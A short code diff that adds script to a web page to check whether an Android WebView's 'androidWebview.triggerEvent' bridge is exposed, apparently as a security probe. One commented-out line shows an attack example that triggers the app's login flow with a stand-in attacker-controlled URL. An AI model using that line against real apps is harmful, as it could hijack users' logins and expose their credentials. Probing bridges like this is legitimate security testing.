@@ -114,6 +114,14 @@
                 alert('Android.yoyShareToInstagram interface not found.');
             }
         }
+
+        if (window.androidWebview && typeof window.androidWebview.triggerEvent === 'function') {
+    alert('SUCCESS: androidWebview.triggerEvent IS accessible!');
+    // Example: Try to trigger the onLogin flow
+    // window.androidWebview.triggerEvent('login', JSON.stringify({ url: 'http://your-attacker-controlled-url.com' }));
+} else {
+    alert('INFO: androidWebview.triggerEvent is NOT accessible from this page.');
+}
     </script>
 </body>
 </html>
